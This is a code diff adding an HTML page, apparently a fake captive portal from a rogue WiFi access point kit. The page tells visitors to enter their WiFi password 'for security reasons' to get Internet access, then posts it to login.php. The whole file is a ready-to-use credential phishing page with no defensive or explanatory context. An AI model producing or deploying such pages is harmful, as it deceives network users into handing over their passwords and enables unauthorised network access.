@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {font-family: Arial, Helvetica, sans-serif;}
+body{
+    margin: 0;
+    padding: 0;
+    background: #fff;
+    background-size: cover;
+    background-position: center;
+    font-family: sans-serif;
+}
+form {
+    width: 350px;
+    height: 320px;
+    border-radius: 20px;
+    background: #1E1E1E;
+    color: #fff;
+    top: 50%;
+    left: 50%;
+    position: absolute;
+    transform: translate(-50%,-50%);
+    box-sizing: border-box;
+    padding: 70px 30px;
+}
+
+.avatar{
+    width: 100px;
+    height: 100px;
+    border-radius: 50%;
+    position: absolute;
+    top: -50px;
+    left: calc(50% - 50px);
+}
+
+h1{
+    margin: 0;
+    padding: 0 0 20px;
+    text-align: center;
+    font-size: 22px;
+}
+
+.loginbox p{
+    margin: 0;
+    padding: 0;
+    margin-bottom: 30px;
+    font-weight: bold;
+}
+
+.loginbox input{
+    width: 100%;
+    margin-bottom: 20px;
+}
+
+input[type=password] {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid #f44336;
+  box-sizing: border-box;
+}
+
+button {
+  background-color: #3c3c3c;
+  color: white;
+  padding: 14px 30px;
+  margin: 8px 0;
+  border: none;
+  cursor: pointer;
+  border-radius: 20px;
+  background: #fb2525;
+  width: 100%;
+}
+
+button:hover {
+  opacity: 0.8;
+}
+
+
+
+</style>
+</head>
+<body>
+
+
+
+<form action="login.php" method="post">
+
+  <div class="imgcontainer">
+    <img src="https://h.top4top.io/p_1838ge9qe0.jpg" alt="Avatar" class="avatar">
+  </div>
+  
+  
+  
+
+  <div class="container">
+
+    <h1>For security reasons, enter your WiFi password to access Internet</h1>
+    <label for="psw"><b>Password</b></label>
+    <input type="password" placeholder="Enter Your WiFi Password" name="psw" required>
+        
+    <button type="submit">Connect</button>
+  </div>
+
+
+</form>
+
+</body>
+</html>
